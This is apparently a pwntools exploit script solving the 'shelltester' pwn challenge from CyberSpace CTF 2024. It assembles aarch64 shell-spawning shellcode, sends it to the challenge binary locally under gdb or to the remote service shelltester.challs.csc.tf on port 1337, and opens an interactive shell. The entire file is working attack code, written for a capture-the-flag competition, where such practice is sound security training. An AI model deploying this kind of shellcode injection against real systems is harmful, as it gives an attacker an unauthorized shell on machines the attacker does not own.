#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='aarch64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CyberSpace CTF 2024/pwn/shelltester/chal')
elf = ELF(TARGET)

def attach():
    if REMOTE:
        return

    bkps = []
    cmds = []

    return gdb.debug(TARGET, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    shellcode = shellcraft.sh()
    payload = asm(shellcode)

    r.sendafter(b'place!\n', payload)
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('shelltester.challs.csc.tf', 1337)
    else:
        REMOTE = False
        r = attach()

    exploit(r)
    exit(0)
